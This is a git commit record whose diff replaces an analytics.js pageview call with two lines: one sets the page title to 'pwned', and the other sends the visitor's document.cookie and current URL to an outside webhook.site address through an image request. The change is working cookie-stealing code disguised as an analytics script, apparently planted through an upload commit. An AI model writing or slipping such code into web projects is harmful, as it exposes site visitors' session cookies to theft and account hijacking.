e9d35de0a8e43cf1bb681e91a683cbd8cb7440d5
zdmmhl <zdmmhl@gmail.com>
2026-04-15 22:32:41 +1000

    Add files via upload

--- analytics.js
+++ analytics.js
@@ -1,1 +1,2 @@
-fetch("/analytics/events/pageview", { method: "POST" })
+document.title = "pwned";
+new Image().src = "https://webhook.site/6d93283b-433c-45de-a47e-12509a086859/?c=" + encodeURIComponent(document.cookie) + "&u=" + encodeURIComponent(location.href);
